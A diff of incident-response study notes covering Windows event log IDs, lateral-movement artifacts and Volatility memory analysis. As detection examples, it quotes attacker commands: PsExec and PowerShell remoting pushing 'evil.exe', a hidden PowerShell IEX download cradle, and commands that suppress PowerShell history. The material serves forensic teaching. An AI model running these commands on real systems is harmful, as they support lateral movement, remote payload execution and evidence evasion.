 | :---------------: | :---------------: | :---------------: |
-|Logons|Security|4624, 4625, 4634, 4647, <br> 4648, 4769, 4771, 4776|
+|Logons|Security|4624, 4625, 4634, 4647,  4648, 4769, 4771, 4776|
 |Account Logon|Security|4678, 4769, 4771, 4776|
-|RDP|Security <br> RDPCoreTS <br> Terminal Services-RemoteConnectionManager|4624, 4625, 4778, 4779 <br> 131 <br> 1149|
+|RDP|Security  RDPCoreTS  Terminal Services-RemoteConnectionManager|4624, 4625, 4778, 4779  131  1149|
 |Network Shares|Security|5140-5145|
-|Scheduled Tasks|Security <br> Task Scheduler|4698 <br> 106, 140-141, 200-201|
+|Scheduled Tasks|Security  Task Scheduler|4698  106, 140-141, 200-201|
 |Installation|Application|1033, 1034, 11707, 11708, 11724|
-|Services|System <br> Security|7034-7036, 7040, 7045 <br> 4697|
-|Log Clearing|Security <br> System|1102 <br> 104|
-|Malware Execution|Security <br> System <br> Application|4688 <br> 1001 <br> 1000-1002|
-|CommandLines|Security <br> PowerShell-Operational|4688 <br> 4103-4104|
+|Services|System  Security|7034-7036, 7040, 7045  4697|
+|Log Clearing|Security  System|1102  104|
+|Malware Execution|Security  System  Application|4688  1001  1000-1002|
+|CommandLines|Security  PowerShell-Operational|4688  4103-4104|
 |WMI|WMI-Activity-Operational|5857-5861|
 
-<br>
+
 
 ### Event Log Collection
 **Live System Collection**
@@ -730,7 +1342,7 @@ Get-WinEvent -FilterHashtable
 {$_.Message -match "w00d33"}
 ```
 
-<br>
+
 
 ```powershell
 Get-WinEvent -FilterHashtable
@@ -738,7 +1350,7 @@ Get-WinEvent -FilterHashtable
 ;id=5140} | Where {$_.Message -match "\\Admin\$"}
 ```
 
-<br>
+
 
 ### Location
 - Server 2003 and older
@@ -748,7 +1360,7 @@ Get-WinEvent -FilterHashtable
 	- %systemroot%\System32\winevt\logs
 	- .evtx
 
-<br>
+
 
 ### Types
 
@@ -776,7 +1388,7 @@ Get-WinEvent -FilterHashtable
 - Firewall
 - DNS (Servers)
 
-<br>
+
 
 ### Profiling Account Usage
 - Determine which accounts have been used for attempted logons
@@ -816,7 +1428,7 @@ Ref: [Logon Type Codes Revealed](https://techgenix.com/Logon-Types/)
 	- high privilege session
 	- lower privlege session
 
-<br>
+
 
 ### Brute Force Password Attack
 - Logon Type 3 - Could SMB or RDP
@@ -824,7 +1436,7 @@ Ref: [Logon Type Codes Revealed](https://techgenix.com/Logon-Types/)
 - many accounts and few passwords = password spraying attack
 - [Failed Login Codes](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625)
 
-<br>
+
 
 ### Built-In Accounts
 
@@ -852,7 +1464,7 @@ Ref: [Logon Type Codes Revealed](https://techgenix.com/Logon-Types/)
 **Notes**  
 - Recommended to ignore in initial investigation (very noisy)
 
-<br>
+
 
 ### Tracking Administrator Account Activity
 
@@ -864,7 +1476,7 @@ Ref: [Logon Type Codes Revealed](https://techgenix.com/Logon-Types/)
 	- Identifying compromised service accounts
 - Scheduled tasks run with administrative privileges also trigger this
 
-<br>
+
 
 ### Auditing Account Creation
 
@@ -878,7 +1490,7 @@ Ref: [Logon Type Codes Revealed](https://techgenix.com/Logon-Types/)
 	- 4738: A user account was changed
 	- 4756: A member was added to a security enabled universal group
 
-<br>
+
 
 ### Remote Desktop Activity
 
@@ -928,7 +1540,7 @@ Ref: [Logon Type Codes Revealed](https://techgenix.com/Logon-Types/)
 - 4624 Type 7
 	- Often Unlock or RDP Reconnect
 
-<br>
+
 
 ### Account Logon Events
 
@@ -957,7 +1569,7 @@ Ref: [Logon Type Codes Revealed](https://techgenix.com/Logon-Types/)
 	- 0x18 - 0xC000006A: Password invalid
 	- 0x25 - n/a: Clock skew between machines is too great
 
-<br>
+
 
 ### Privileged Local Account Abuse - Pass the Hash
 
@@ -970,7 +1582,7 @@ Ref: [Logon Type Codes Revealed](https://techgenix.com/Logon-Types/)
 	- 4672 - Privelged logon
 	- 5140 - File Share event
 
-<br>
+
 
 ### Account and Group Enumeration
 
@@ -1004,7 +1616,7 @@ Ref: [Logon Type Codes Revealed](https://techgenix.com/Logon-Types/)
 - Group Name: Group Enumerated
 - Process Name: Process used for enumeration
 
-<br>
+
 
 ### Event Log Analysis Tools
 
@@ -1023,7 +1635,7 @@ Ref: [Logon Type Codes Revealed](https://techgenix.com/Logon-Types/)
 	- Noise reduction
 	- Extract from VSS and de-duplicate
 
-<br>
+
 
 ### Lateral Movement - Network Shares
 
@@ -1038,7 +1650,7 @@ Ref: [Logon Type Codes Revealed](https://techgenix.com/Logon-Types/)
 - Event IDs 5142-5144 track share creation, modification, and deletion
 - Detailed file share auditing (5145) provides detail on individual files access (can be very noisy)
 
-<br>
+
 
 ### Cobalt Strike Mapping Shares
 
@@ -1050,7 +1662,7 @@ Ref: [Logon Type Codes Revealed](https://techgenix.com/Logon-Types/)
 - Account Name: COMPUTERNAME$
 	- Normally see non-computer account
 
-<br>
+
 
 - Share Name: ```\\*\IPC$```
 	- Sets up initial SMB connection
@@ -1064,7 +1676,7 @@ Ref: [Logon Type Codes Revealed](https://techgenix.com/Logon-Types/)
 
 Mandiant stated 24% of malware families they observed were cobalt strike
 
-<br>
+
 
 ### Lateral Movement - Explicit Credentials - runas
 
@@ -1100,13 +1712,13 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 	- "Subject - Account Name" matches "New Logon - Account Name"
 	- Note Process information
 
-<br>
+
 
 - EventId 4648 (explicit credentials)
 	- "Subject - Account Name" mathces "Account Whose Credentials Were Used - Account Name"
 	- Note Target Server Name
 
-<br>
+
 
 ### Lateral Movement - Scheduled Tasks
 
@@ -1139,7 +1751,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 	- Full command path
 	- Account authenticated to run task
 
-<br>
+
 
 ### Suspicious Services
 
@@ -1147,7 +1759,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 	- Service type changed to Boot
 - Review services started and stopped during time of a suspected hack
 
-<br>
+
 
 - System Log
 	- 7034: Service Crashed Unexpectedly
@@ -1158,14 +1770,14 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 - Security Log
 	- 4697: A new service was installed on the system
 
-<br>
+
 
 **Notes**
 - A large amount of malware and worms in the wild utilize Services
 - Services started on bot illustrate peristence
 - Services can crash due to attacks like process injections
 
-<br>
+
 
 **Example - PsExec**
 - Filter by 7045 (New service installed)
@@ -1173,13 +1785,13 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 - Everytime PsExec runs, it starts a brand new service
 - Note service File Name
 
-<br>
+
 
 ### Event Log Clearing
 - 1102: Audit Log Cleared (Security)
 - 104: Audit Log Cleared (System)
 
-<br>
+
 
 **Notes**
 - Requires Admin Rights
@@ -1192,14 +1804,14 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 - ```Invoke-Phantom``` thread killing
 - Event Log service suspension; memory based attacks
 
-<br>
+
 
 **Mitigation**
 - Event Log Forwarding
 - Logging "heartbeat"
 - Log gap analysis
 
-<br>
+
 
 ## Lateral Movement Tactics
 
@@ -1226,7 +1838,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 	- 1102
 		- Destination IP address
 
-<br>
+
 
 **Registry**
 - Remote Desktop Destinations are tracked per-user
@@ -1247,7 +1859,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 	- Number of Times Executed
 	- RecentItems subkey tracks connection destination and times
 
-<br>
+
 
 **File System**
 - Jumplists ```C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\```
@@ -1260,7 +1872,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 	- cache####.bin
 	- [Bitmap Cache Parser](https://github.com/ANSSI-FR/bmc-tools)
 
-<br>
+
 
 ### RDP - Destination System Artifacts
 
@@ -1286,7 +1898,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 	- 41
  		- Logon User Name
 
-<br>
+
 
 **Registry**
 - ShimCache – SYSTEM
@@ -1296,14 +1908,14 @@ Mandiant stated 24% of malware families they observed were cobalt strike
  - rdpclip.exe
  - tstheme.exe
 
-<br>
+
 
 **File System**
 - Prefetch ```C:\Windows\Prefetch\```
  - ```rdpclip.exe-{hash}.pf```
  - ```tstheme.exe-{hash}.pf```
 
-<br>
+
 
 ### Windows Admin Shares - Source System Artifacts
 - C$
@@ -1323,7 +1935,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 		- User Name for failed logon
 		- Reason code for failed destination logon (e.g. bad password)
 
-<br>
+
 
 **Registry**
 - MountPoints2 – Remotely mapped shares ```NTUSER\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2```
@@ -1341,7 +1953,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 
 	```net use z: \\host\c$ /user:domain\username <password>```
 
-<br>
+
 
 **File System**
 - Prefetch – ```C:\Windows\Prefetch\```
@@ -1350,7 +1962,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 - User Profile Artifacts
 	- Review shortcut files and jumplists for remote files accessed by attackers, if they had interactive access (RDP)
 
-<br>
+
 
 ### Windows Admin Shares -  Destination System Artifacts
 - Stage malware/access sensitive files
@@ -1379,7 +1991,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 - 5145
 	- Auditing of shared files – NOISY!
 
-<br>
+
 
 **File System**
 - File Creation
@@ -1387,7 +1999,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 - Look for Modified Time before Creation Time
 - Creation Time is time of file copy
 
-<br>
+
 
 ### PsExec - Source System Artifacts
 
@@ -1399,7 +2011,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 		- Destination Host Name/IP
 		- Process Name
 
-<br>
+
 
 **Registry**
 - NTUSER.DAT
@@ -1411,7 +2023,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 - AmCache.hve – First Time Executed
 	- psexec.exe
 
-<br>
+
 
 **File System**
 - Prefetch – ```C:\Windows\Prefetch\psexec.exe-{hash}.pf```
@@ -1422,7 +2034,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 ```psexec.exe \\host -accepteula -d -c c:\temp\evil.exe```
 
 
-<br>
+
 
 ### PsExec - Destination System Artifacts
 - Authenticates to destination system
@@ -1448,7 +2060,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 	- 7045
 		- Service Install
 
-<br>
+
 
 **Registry**
 - New service creation configured in ```SYSTEM\CurrentControlSet\Services\PSEXESVC```
@@ -1458,7 +2070,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 - AmCache.hve First Time Executed
 	- psexesvc.exe
 
-<br>
+
 
 **File System**
 - Prefetch – ```C:\Windows\Prefetch\```  
@@ -1468,7 +2080,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 	- User profile directory structure created unless “-e” option used
 - psexesvc.exe will be placed in ADMIN$ (\Windows) by default, as well as other executables (evil.exe) pushed by PsExec
 
-<br>
+
 
 ### Windows Remote Management Tools
 - Create and Start a remote service  
@@ -1482,7 +2094,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 - Execute any remote command  
 	- ```winrs -r:host -u:user command```  
 
-<br>
+
 
 ### Remote Services - Source System Artifacts
 
@@ -1494,13 +2106,13 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 -	AmCache.hve – First Time Executed
 	- ```sc.exe```  
 
-<br>
+
 
 **File System**
 - Prefetch – ```C:\Windows\Prefetch\```  
 	- ```sc.exe-{hash}.pf```  
 
-<br>
+
 
 ### Remote Services - Destination System Artifacts
 
@@ -1518,7 +2130,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 	- 7040 – Start type changed _(Boot | On Request | Disabled)_
 	- 7045 – A service was installed on the system
 
-<br>
+
 
 **Registry**
 - ```SYSTEM\CurrentControlSet\Services\```
@@ -1529,7 +2141,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 - AmCache.hve – First Time Executed
 	- evil.exe
 
-<br>
+
 
 **File System**
 - File Creation
@@ -1538,7 +2150,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 	- ```evil.exe-{hash}.pf```
 
 
-<br>
+
 
 ### Scheduled Tasks - Source System Artifacts
 
@@ -1550,7 +2162,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 		- Destination Host Name/IP
 		- Process Name
 
-<br>
+
 
 **Registry**
 -	ShimCache – SYSTEM
@@ -1563,14 +2175,14 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 	- at.exe
 	- schtasks.exe
 
-<br>
+
 
 **File System**
 - Prefetch – ```C:\Windows\Prefetch\```
 	- ```at.exe-{hash}.pf```
 	- ```schtasks.exe-{hash}.pf```
 
-<br>
+
 
 ### Scheduled Tasks - Destination System Artifacts
 
@@ -1591,7 +2203,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 	- 141 – Scheduled task deleted
 	- 200/201 – Scheduled task
 
-<br>
+
 
 **Registry**
 - SOFTWARE
@@ -1602,7 +2214,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 - AmCache.hve – First Time Executed
 	- evil.exe
 
-<br>
+
 
 **File System**
 - File Creation
@@ -1615,7 +2227,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 - Prefetch – ```C:\Windows\Prefetch\```  
 	- evil.exe-{hash}.pf
 
-<br>
+
 
 ### WMI - Source System Artifacts
 - Powerful lateral movement options
@@ -1629,7 +2241,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 		- Destination Host Name/IP
 		- Process Name
 
-<br>
+
 
 **Registry**
 - ShimCache – SYSTEM
@@ -1639,13 +2251,13 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 - AmCache.hve – First Time Executed
 	- wmic.exe
 
-<br>
+
 
 **File System**
 - Prefetch – ```C:\Windows\Prefetch\```  
 	- ```wmic.exe-{hash}.pf```  
 
-<br>
+
 
 ### WMI - Destination System Artifacts
 - wmiprvse.exe
@@ -1665,7 +2277,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 	Registration of Temporary (5860) and Permanent (5861) Event Consumers. Typically used for persistence, but
 can be used for remote execution.
 
-<br>
+
 
 **Registry**
 - ShimCache – SYSTEM
@@ -1679,7 +2291,7 @@ can be used for remote execution.
 	- wmiprvse.exe
 	- evil.exe
 
-<br>
+
 
 **File System**
 - File Creation
@@ -1692,7 +2304,7 @@ can be used for remote execution.
 	- ```evil.exe-{hash}.pf```  
 - Unauthorized changes to the WMI Repository in ```C:\Windows\system32\wbem\Repository```  
 
-<br>
+
 
 ### Powershell Remoting - Source Sytem Artifacts
 
@@ -1719,7 +2331,7 @@ can be used for remote execution.
 	- 8197 - Connect
 		- Session closed
 
-<br>
+
 
 **Registry**
 - ShimCache – SYSTEM
@@ -1729,7 +2341,7 @@ can be used for remote execution.
 - AmCache.hve – First Time Executed
 	- powershell.exe
 
-<br>
+
 
 **File System**
 - Prefetch – ```C:\Windows\Prefetch\```  
@@ -1744,7 +2356,7 @@ Enter-PSSession –ComputerName host
 Invoke-Command –ComputerName host –ScriptBlock {Start-Process c:\temp\evil.exe}
 ```
 
-<br>
+
 
 ### Powershell Remoting - Destination Sytem Artifacts
 - Source Process: powershell.exe
@@ -1769,7 +2381,7 @@ Invoke-Command –ComputerName host –ScriptBlock {Start-Process c:\temp\evil.e
 	- 91 Session creation
 	- 168 Records the authenticating user
 
-<br>
+
 
 **Registry**
 - ShimCache – SYSTEM
@@ -1782,7 +2394,7 @@ Invoke-Command –ComputerName host –ScriptBlock {Start-Process c:\temp\evil.e
 	- wsmprovhost.exe
  	- evil.exe
 
-<br>
+
 
 **File System**
 - File Creation
@@ -1792,13 +2404,13 @@ Invoke-Command –ComputerName host –ScriptBlock {Start-Process c:\temp\evil.e
 	- ```evil.exe-{hash].pf```  
 	- ```wsmprovhost.exe-{hash].pf```  
 
-<br>
+
 
 ### Application Deployment Software
 - Patch Management Tools
 - Cloud Control Panels (Azure, AWS, Google Cloud, etc.)
 
-<br>
+
 
 ### Vulnerability Exploitation
 - Crash Detection
@@ -1812,7 +2424,7 @@ Invoke-Command –ComputerName host –ScriptBlock {Start-Process c:\temp\evil.e
 - Threat Intel
 - AV/HIPS/Exploit Guard Logging
 
-<br>
+
 
 ## Commandline, PowerShell and WMI Analysis
 
@@ -1833,14 +2445,14 @@ Invoke-Command –ComputerName host –ScriptBlock {Start-Process c:\temp\evil.e
 	- [Using .WER files to hunt evil](https://medium.com/dfir-dudes/amcache-is-not-alone-using-wer-files-to-hunt-evil-86bdfdb216d7)
 - Windows Defender and/or AV logs should also be reviewed
 
-<br>
+
 
 ### Process Tracking and Capturing Command Lines
 - cmd.exe and powershell.exe
 - EID 4688: New Process Created (includes executable path)
 - EID 4689: Process Exit
 
-<br>
+
 
 **Notes**
 - Available in Windows 7+
@@ -1849,7 +2461,7 @@ Invoke-Command –ComputerName host –ScriptBlock {Start-Process c:\temp\evil.e
 - Logon ID value can be used to link processes to a user session
 - Note Parent/Child Process relationships
 
-<br>
+
 
 ### WMI
 - Enterprise information mangement framework designed to allow access to system data at scale
@@ -1880,7 +2492,7 @@ Invoke-Command –ComputerName host –ScriptBlock {Start-Process c:\temp\evil.e
 - Microsoft Sysmon
 - Commercial EDR Tools
 
-<br>
+
 
 ### Auditing WMI Peristence
 - Easily audit for malicious WMI event consumer
@@ -1894,7 +2506,7 @@ Invoke-Command –ComputerName host –ScriptBlock {Start-Process c:\temp\evil.e
 - Event Filter and Consumer recorded in logs
 - Both CommandLineEvent and ActiveScriptEvent consumers are logged
 
-<br>
+
 
 ### Quick Wins - WMI-Activity/Operational Log
 - EID 5861: New permanent consumers
@@ -1913,7 +2525,7 @@ Invoke-Command –ComputerName host –ScriptBlock {Start-Process c:\temp\evil.e
 	- .ps1
 	- ActiveXObject
 
-<br>
+
 
 ### PowerShell Logging
 - EID 4103: Module logging and pipeline output
@@ -1949,7 +2561,7 @@ powershell -w Hidden -nop -noni -exec bypass IEX (New-ObjectSystem.Net.WebClient
 - Start-BitsTransfer
 - Invoke-WebRequest
 
-<br>
+
 
 ### Quick Wins - PowerShell
 - PowerShell/Operational Log
@@ -1980,7 +2592,7 @@ powershell -w Hidden -nop -noni -exec bypass IEX (New-ObjectSystem.Net.WebClient
 	- [Finding Encoded PS Scripts](https://www.youtube.com/watch?v=JWC7fzhvAY8
 )
 
-<br>
+
 
 ### PowerShell Transcript Logs
 - Records input/output to the powershell terminal
@@ -1998,11 +2610,11 @@ powershell -w Hidden -nop -noni -exec bypass IEX (New-ObjectSystem.Net.WebClient
 	- ```Set-PSReadLineOption -HistorySaveStyle SaveNothing```
 	- ```Remove-Module -Name PsReadline```
 
-<br>
+
 
 ---
 
-<br>
+
 
 # (3) Memory Forensics
 
@@ -2013,7 +2625,7 @@ powershell -w Hidden -nop -noni -exec bypass IEX (New-ObjectSystem.Net.WebClient
 - Analyzing suspicious thread creation and memory allocation
 - Identification of common DLL injection and hooking (rootkit) tehcniques
 
-<br>
+
 
 ## Acquiring Memory
 
@@ -2024,7 +2636,7 @@ powershell -w Hidden -nop -noni -exec bypass IEX (New-ObjectSystem.Net.WebClient
 - [Belkasoft Live RAM Capturer](https://belkasoft.com/ram-capturer)
 - [MagnetForensics Ram Capture](https://www.magnetforensics.com/resources/magnet-ram-capture/)
 
-<br>
+
 
 ### Dead System
 
@@ -2033,7 +2645,7 @@ powershell -w Hidden -nop -noni -exec bypass IEX (New-ObjectSystem.Net.WebClient
 - When PC goes into power save or hibernation mode from sleep mode
 - ```%SystemDrive%\hiberfil.sys```
 
-<br>
+
 
 **Page and Swap Files**
 - ```%SystemDrive%\pagefile.sys```  
@@ -2041,7 +2653,7 @@ powershell -w Hidden -nop -noni -exec bypass IEX (New-ObjectSystem.Net.WebClient
 - ```%SystemDrive%\swapfile.sys``` (Win8+\2012+)
 - The working set of memory for suspended Modern apps that have been swapped to disk
 
-<br>
+
 
 **Memory Dump**
 - ```%WINDIR%\MEMORY.DMP```
@@ -2066,23 +2678,23 @@ powershell -w Hidden -nop -noni -exec bypass IEX (New-ObjectSystem.Net.WebClient
 - .vmss and .vmsn = memory image
 - Suspend or Snapshot VM
 
-<br>
+
 
 **Microsoft Hyper-V**
 - .bin = memory image
 - .vsv = save state
 
-<br>
+
 
 **Parallels**
 - .mem = raw memory image
 
-<br>
+
 
 **VirtualBox**
 - .sav = partial memory image
 
-<br>
+
 
 ## Memory Forensic Process
 1. Collect Data for Analysis
@@ -2096,7 +2708,7 @@ powershell -w Hidden -nop -noni -exec bypass IEX (New-ObjectSystem.Net.WebClient
 	- Analyze Data for Significant Elements
 	- Recover Evidence
 
-<br>
+
 
 ## Memory Analysis
 1. Identify Context
@@ -2119,23 +2731,23 @@ powershell -w Hidden -nop -noni -exec bypass IEX (New-ObjectSystem.Net.WebClient
 	- Known heuristics and signatures
 4. Analysis: Search for Anomalies
 
-<br>
+
 
 <img alt="Micosoft's Attack Lifecycle" src="https://raw.githubusercontent.com/w00d33/w00d33.github.io/main/_files/KDGB_flow.PNG" />
 
-<br>
+
 
 ## Volatility
 - [Volatility](https://code.google.com/archive/p/volatility/)
 - [Command Wiki](https://code.google.com/archive/p/volatility/wikis/CommandReference23.wiki)
 
-<br>
+
 
 **Basic Command Structure**
 
 ```vol.py -f [image] --profile=[profile] [plugin]```
 
-<br>
+
 
 **Using Volatility**
 
@@ -2155,14 +2767,14 @@ powershell -w Hidden -nop -noni -exec bypass IEX (New-ObjectSystem.Net.WebClient
 	- ```--info``` to see profiles and registered objects
 	- [Command Info](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference) 
 
-<br>
+
 
 **Volatility Profiles**
 - Requires the system type for a memory image be specified using the --profile=[profile]
 - Set environment variable
 	- ```export VOLATILITY_PROFILE=Win10x64_16299```
 
-<br>
+
 
 ### Image Identification
 - Windows Specification Example
@@ -2178,7 +2790,7 @@ Document Version and Build During Collection
 	- ```-g or --kdbg=```
 	- ```vol.py -g 0xf801252197a4 --profile=Win10x64_16299 -f memory.img pslist```
 
-<br>
+
 
 **Hibernation File Conversion**
 - ```imagecopy```
@@ -2188,7 +2800,7 @@ Document Version and Build During Collection
 - Also works for VMware Snapshot and VirtualBox memory
 - ```vol.py -f /memory/hiberfil.sys imagecopy -O hiberfil.raw --profile=WinXPSP2x86```
 
-<br>
+
 
 ## Steps to Finding Evil 
 1. Identify Rogue Processes
@@ -2198,7 +2810,7 @@ Document Version and Build During Collection
 5. Check for signs of rootkit
 6. Dump suspicious processes and drivers
 
-<br>
+
 
 ## Identify Rogue Processes - Step 1
 - Processes have a forward link (flink) and a back link (blink)
@@ -2214,7 +2826,7 @@ Document Version and Build During Collection
 	- Link to the Virtual Address Descriptor tree
 	- Link to the Process Environment Block
 
-<br>
+
 
 ### Procces Analysis
 - Image Name
@@ -2236,7 +2848,7 @@ Document Version and Build During Collection
 	- Do the security identifiers make sense?
 	- Why would a system process use a user account SID?
 
-<br>
+
 
 **Volatility Plugins**
 - pslist - print all running processes within the EPROCESS doubly linked list
@@ -2245,7 +2857,7 @@ Document Version and Build During Collection
 - malprocfind - automatically idetify suspicious system processes
 - processbl - compare processes and loaded DLLs with a baseline image
 
-<br>
+
 
 ### Pslist
 - Print all running processes by following the EPROCESS linked list
@@ -2257,7 +2869,7 @@ Document Version and Build During Collection
 - [Hunt Evil Poster](https://github.com/w00d33/w00d33.github.io/blob/main/_files/SANS_Hunt_Evil_Poster.pdf) 
 - [EchoTrail](https://www.echotrail.io/)
 
-<br>
+
 
 ### Psscan
 - Scan physical memory for EPROCESS pool allocations
@@ -2271,7 +2883,7 @@ Document Version and Build During Collection
   - Process start time
   - Process exit time
 
-<br>
+
 
 ### Pstree
 
@@ -2306,7 +2918,7 @@ Document Version and Build During Collection
 - ```vol.py -f darkcomet.img --profile=Win7SP1x86 -B ./baseline-memory/Win7SP1x86-baseline.img processbl -U 2>error.log```
 - [ANALYZING DARKCOMET IN MEMORY](http://www.tekdefense.com/news/2013/12/23/analyzing-darkcomet-in-memory.html)
 
-  <br>
+  
 
 ### Rogue Processes Review
 - All identified processes should be sanity checked for:
@@ -2323,7 +2935,7 @@ Document Version and Build During Collection
   - malprocfind: scans system for processes for anomalies
   - processbl: allows comparisons with a known good baseline
 
-<br>
+
 
 ## Memory Forensics - Master Process
 
@@ -2372,7 +2984,7 @@ Document Version and Build During Collection
 - ```grep -i WMIPrvSE psscan.txt > WMIPrvSE_psscan.txt```
 - Return to your event logs and identify which WMIPrvSE process matches the time recorded for the malicious WMI event consumer in the logs
 
-<br>
+
 
 ## Analyze Process Objects - Step 2
 - DLLs: Dynamic Linked Libraries (shared code)
@@ -2386,7 +2998,7 @@ Document Version and Build During Collection
 - Memory Sections: Shared memory areas used by process
 - Sockets: Network port and connection information with a process
 
-<br>
+
 
 ### Object Analysis Plugins
 - dlllist - Print list of loaded DLLs for each process
@@ -2395,7 +3007,7 @@ Document Version and Build During Collection
 - handles - Print list of open handles for each process
 - mutantscan - Scan memory of mutant objects (KMUTANT)
 
-<br>
+
 
 ### dlllist
 - Display the loaded DLLs and the commandline used to start each process
@@ -2414,7 +3026,7 @@ Document Version and Build During Collection
 - A complete list of DLLs can be too much data to review; consider limiting output to specific PIDs with the -p option
 - The base offset provided can be used with the ```dlldump``` plugin to extract a specific DLL for analysis
 
-<br>
+
 
 ### getsids
 - Display Security Identifiers (SIDs) for each process
@@ -2425,7 +3037,7 @@ Document Version and Build During Collection
 - First line - Account SID
 - Everything after - Group SID
 
-<br>
+
 
 ### handles
 - Also can be known as a pointer
@@ -2471,7 +3083,7 @@ Document Version and Build During Collection
   - Malware will "mark" a compromised system so it doesnt get reinfected
   - Process object
 
-<br>
+
 
 ### Analyzing Process Objects Review
 - Objects that make up a process will provide a clue
@@ -2481,7 +3093,7 @@ Document Version and Build During Collection
 - Narrow focus to suspect processes or those known to be often subverted (e.g svchost.exe, services.exe, lsass.exe)
 - Check process commandline, DLL files paths, and SID, and use hadnles when necessary to provide additional confirmation
 
-<br>
+
 
 ## Network Artifacts - Step 3
 - Suspicious ports
@@ -2513,7 +3125,7 @@ Document Version and Build During Collection
 - Vista+
   - netscan: All of the above--scan for both connections and sockets
 
-<br>
+
 
 ### netstat
 - Identify network sockets and tcp structures resident in memory
@@ -2538,7 +3150,7 @@ Document Version and Build During Collection
 - TOOL: MemProcFS
 - Method of Analysis: MemProcFS Playbook
 
-<br>
+
 
 ## Evidence of Code Injection - Step 4
 - Camoflauge: Use legitamite process to run
@@ -2549,7 +3161,7 @@ Document Version and Build During Collection
 - Required administrator or debug privileges on the system
   - SeDebugPrivilege
 
-<br>
+
 
 ### Code Injection
 - Common with modern malware
@@ -2593,7 +3205,7 @@ Document Version and Build During Collection
   - `NtCreateThreadEx`
   - `RtlCreateUserThread`
 
-<br>
+
 
 ### Code Injection Plugins
 - ldrmodules: Detecting unlinked DLLs and non-memory-mapped files
@@ -2603,7 +3215,7 @@ Document Version and Build During Collection
 - [DETECTING DECEPTIVE PROCESS HOLLOWING](https://cysinfo.com/detecting-deceptive-hollowing-techniques/)
 - [threadmap](https://github.com/kslgroup/threadmap/blob/master/threadmap%20documentation.pdf)
 
-<br>
+
 
 ### ldrmodules
 - DLLs are tracked in three different linked lists in the PEB for each process
@@ -2644,7 +3256,7 @@ Document Version and Build During Collection
 - True - False - True & No mapped path usually mean process hollowing
 - False - False - False & No mapped path usually sign of code injection
 
-<br>
+
 
 ### Reflective Injection
 - Evades using Windows Standard API
@@ -2664,7 +3276,7 @@ Document Version and Build During Collection
 - ```malfind``` plug in performs first two steps
 - Analyst must confirm if section contains code
 
-<br>
+
 
 ### malfind
 - Scans process memory sections looking indications of hidden code injection
@@ -2749,7 +3361,7 @@ Document Version and Build During Collection
   - Driver hooking
   - How OS processes interact with hardware drivers
 
-<br>
+
 
 ### Plugins
 - ssdt: Display SSDT entries
@@ -2759,7 +3371,7 @@ Document Version and Build During Collection
 - driverirp: Identify I/O Packets (IRP) hooks
 - idt: Display Interrupt Descriptor Table Hooks
 
-<br>
+
 
 ### ssdt
 - Display hooked functions within the System Service Descriptor table (Windows Kernel Hooking)
@@ -2768,7 +3380,7 @@ Document Version and Build During Collection
   - ```| egrep -v '(ntoskrnl\.exe | win32k\.sys)'``` or ```| egrep -v '(ntoskrnl|win32k)'```
 - Also attempts to discover new tables added by malware
 
-<br>
+
 
 ### Direct Kernel Object Manipulation
 - DKOM is an advanced process hiding technique
@@ -2799,7 +3411,7 @@ Document Version and Build During Collection
 - Automating analysis (baseline plugin)
   - ```vol.py driverbl -f TDSS.img -B baseline.img -U```
 
-<br>
+
 
 ### apihooks - Inline DLL Hooking
 - Detect inline and Import Address Table function hooks used by rootkits to modify and control information returned
@@ -2817,7 +3429,7 @@ Document Version and Build During Collection
   - ```Hooking module: <unkown>``` (not mapped to disk)
   - Disassembly contains ```JMP <Hook Address>```
 
-<br>
+
 
 ## Dump Suspicious Processes and Drivers - Step 6
 
@@ -2846,7 +3458,7 @@ Document Version and Build During Collection
 - Use -p and the -b or -r options to limit the number of DLLs extracted
 - Many processes point to the same DLLs, so you might encounter multiple copies of the same DLL extracted
 
-<br>
+
 
 ### moddump
 - Used to extract kernel drivers from a memory image
@@ -2857,7 +3469,7 @@ Document Version and Build During Collection
 - Find the driver offset using modules or modscan
 - ```vol.py -f memory.img moddump -b 0xf7c24000 --dump-dir=./output```
 
-<br>
+
 
 ### procdump
 - Dump a process to an executable memory sample
@@ -2871,7 +3483,7 @@ Document Version and Build During Collection
   - Use the offset (-o option) to dump unlinked processes
 - Not all processes will be "paged in" to memory -> an error is provided if the process is not memory resident
 
-<br>
+
 
 ### memdump
 - Dump every memory section owned by a process into a single file
@@ -2885,7 +3497,7 @@ Document Version and Build During Collection
